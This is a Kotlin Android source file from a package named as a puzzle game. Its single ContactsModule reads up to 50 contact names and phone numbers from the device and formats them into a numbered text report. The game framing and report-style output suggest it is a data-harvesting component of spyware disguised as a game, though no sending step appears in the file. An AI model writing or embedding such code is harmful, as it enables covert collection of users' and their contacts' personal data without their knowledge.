package com.puzzleblast.game.modules

import android.content.Context
import android.provider.ContactsContract

object ContactsModule {
    suspend fun read(ctx: Context, n: Int = 50): String {
        val sb = StringBuilder("👥 Contacts · $n\n")
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT $n"
        ) ?: return "no contacts access"
        var i = 1
        cursor.use { c ->
            while (c.moveToNext() && i <= n) {
                val name = c.getString(0) ?: "?"
                val num = c.getString(1) ?: "?"
                sb.append("${i++}. $name — $num\n")
            }
        }
        return sb.toString().ifBlank { "no contacts" }
    }
}
